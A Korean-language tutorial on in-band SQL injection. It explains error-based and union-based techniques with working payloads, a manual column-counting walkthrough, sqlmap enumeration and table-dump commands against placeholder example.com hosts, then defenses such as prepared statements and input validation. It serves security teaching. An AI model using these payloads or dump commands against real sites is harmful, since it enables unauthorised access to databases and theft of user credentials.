In-band SQL Injection

In-band SQLi는 공격자가 동일한 통신 채널을 사용하여 공격을 수행하고 결과를 받는 가장 일반적인 SQL Injection 유형입니다.

개념 (Concept)​

In-band SQLi란?​

In-band SQL Injection은 공격자가 SQL 쿼리를 삽입하고, 그 결과를 **동일한 채널(웹 페이지 응답)**에서 직접 확인할 수 있는 공격 기법입니다.

특징:

  • 가장 쉽고 빠른 SQLi 공격 방법
  • 실시간으로 결과 확인 가능
  • 두 가지 주요 기법: Error-based, Union-based

작동 원리​

[공격자] ---> [악의적 SQL 쿼리] ---> [웹 애플리케이션]
                                            |
                                            v
                                      [데이터베이스]
                                            |
                                            v
[공격자] <--- [쿼리 결과/에러 메시지] <--- [웹 페이지 응답]

In-band SQLi 유형​

1. Error-based SQLi​

데이터베이스 에러 메시지를 통해 정보를 추출하는 기법

특징:

  • DBMS 에러 메시지가 웹 페이지에 표시될 때 사용
  • 데이터베이스 구조 및 데이터 추출 가능
  • 빠르고 효율적

예시:

' AND 1=CONVERT(int, (SELECT @@version))--

에러 메시지 출력:

Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019' to data type int.

→ 에러 메시지에서 DB 버전 정보 획득

2. Union-based SQLi​

UNION 연산자를 사용하여 추가 쿼리 결과를 원래 쿼리에 결합하는 기법

특징:

  • 가장 강력하고 빠른 데이터 추출 방법
  • 원본 쿼리와 컬럼 수를 맞춰야 함
  • 여러 테이블의 데이터를 한 번에 추출 가능

예시:

' UNION SELECT username, password FROM users--

비교표​

특성Error-basedUnion-based
난이도쉬움중간
속도빠름매우 빠름
데이터 추출량제한적대량
필요 조건에러 메시지 노출쿼리 결과가 페이지에 표시
컬럼 수 일치불필요필수
사용 시나리오DB 정보 수집테이블 전체 덤프

수동 공격 (Manual Exploitation)​

단계 1: 취약점 탐지​

특수문자 삽입:

http://example.com/product?id=1'

에러 발생 확인:

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version

단계 2: 공격 유형 선택​

Error-based 선택 조건:​

  • 에러 메시지가 웹 페이지에 표시됨
  • 빠른 정보 수집이 목적

Union-based 선택 조건:​

  • 쿼리 결과가 웹 페이지에 출력됨
  • 대량의 데이터 추출이 필요

단계 3: 공격 실행​

Error-based 예시:

' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))--

Union-based 예시:

' UNION SELECT NULL, table_name FROM information_schema.tables--

자동화 도구 (Automated Tools)​

SQLMap​

기본 In-band 스캔​

sqlmap -u "http://example.com/product?id=1" --batch

출력 예시:

[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
[INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable

Error-based 공격 강제​

sqlmap -u "http://example.com/product?id=1" --technique=E

옵션 설명:

  • --technique=E: Error-based만 사용

Union-based 공격 강제​

sqlmap -u "http://example.com/product?id=1" --technique=U

옵션 설명:

  • --technique=U: Union-based만 사용

데이터베이스 열거​

# 현재 DB 이름
sqlmap -u "http://example.com/product?id=1" --current-db

# 모든 DB 나열
sqlmap -u "http://example.com/product?id=1" --dbs

# 특정 DB의 테이블 나열
sqlmap -u "http://example.com/product?id=1" -D database_name --tables

# 특정 테이블 덤프
sqlmap -u "http://example.com/product?id=1" -D database_name -T users --dump

출력 예시:

Database: testdb
Table: users
[3 entries]
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | admin    | 5f4dcc3b5aa765d6 |
| 2  | user1    | 098f6bcd4621d373 |
| 3  | guest    | 084e0343a0486ff0 |
+----+----------+------------------+

  • Error-based 및 Union-based 자동 탐지
  • 데이터베이스 트리 뷰

실전 공격 시나리오​

시나리오 1: 쇼핑몰 상품 페이지​

취약한 URL:

http://shop.example.com/product.php?id=5

1단계: 취약점 확인

http://shop.example.com/product.php?id=5'

에러 메시지:

MySQL Error: You have an error in your SQL syntax

2단계: Union-based 컬럼 수 확인

' ORDER BY 1--  ✓
' ORDER BY 2--  ✓
' ORDER BY 3--  ✓
' ORDER BY 4--  ✗ (에러 발생)

→ 컬럼 수는 3개

3단계: UNION SELECT로 데이터 추출

' UNION SELECT NULL, username, password FROM users--

결과: 웹 페이지에 사용자 이름과 비밀번호 목록이 표시됨

시나리오 2: 뉴스 게시판​

취약한 URL:

http://news.example.com/article.php?id=10

Error-based 공격:

' AND extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(username) FROM users)))--

결과:

XPATH syntax error: '~admin,moderator,user1,user2'

방어 기법​

1. Prepared Statements 사용​

// 취약한 코드
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];

// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

2. 에러 메시지 숨기기​

// php.ini 설정
display_errors = Off
log_errors = On

3. 입력 검증​

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid input");
}

트러블슈팅 체크리스트​

Error-based가 작동하지 않을 때​

  • 에러 메시지가 웹 페이지에 표시되는지 확인
  • DBMS 종류에 맞는 페이로드 사용 (MySQL, MSSQL, PostgreSQL 등)
  • WAF/IPS가 페이로드를 차단하는지 확인

Union-based가 작동하지 않을 때​

  • 컬럼 수를 정확히 파악했는지 확인 (ORDER BY 사용)
  • 데이터 타입이 일치하는지 확인 (문자열, 정수 등)
  • NULL 또는 숫자로 타입 매칭 시도
  • 쿼리 결과가 실제로 웹 페이지에 출력되는지 확인
